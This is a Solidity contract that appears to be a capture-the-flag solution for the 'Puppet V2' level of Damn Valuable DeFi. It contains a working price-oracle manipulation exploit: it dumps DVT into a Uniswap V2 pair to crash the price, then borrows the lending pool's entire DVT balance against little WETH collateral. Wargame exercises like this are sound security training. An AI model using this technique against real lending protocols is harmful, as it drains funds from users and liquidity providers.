// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IUniV2 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
}

contract PuppetV2Attack {

    IUniV2 uniV2;
    IPuppetV2Pool puppetPool;
    DamnValuableToken dvt;
    IERC20 weth;

    constructor(address _uniAddress, address _puppetPool, address _dvtAddress, address _wethAddress) {
        uniV2 = IUniV2(_uniAddress);
        puppetPool = IPuppetV2Pool(_puppetPool);
        dvt = DamnValuableToken(_dvtAddress);
        weth = IERC20(_wethAddress);

        dvt.approve(_uniAddress, type(uint).max);
        weth.approve(_uniAddress, type(uint).max);
        weth.approve(_puppetPool, type(uint).max);
    }

    function attack() external {
        dvt.transferFrom(msg.sender, address(this), dvt.balanceOf(msg.sender));
        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));

        uint dvtToSwap = dvt.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        uint256[] memory amountsOut = uniV2.getAmountsOut(dvtToSwap, path);
        uint256 maxAmount = amountsOut[1] - (amountsOut[1] * 1 / 100); // 1% slippage

        uniV2.swapExactTokensForTokens(dvtToSwap, maxAmount, path, address(this), block.timestamp);

        puppetPool.borrow(dvt.balanceOf(address(puppetPool)));

        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }

}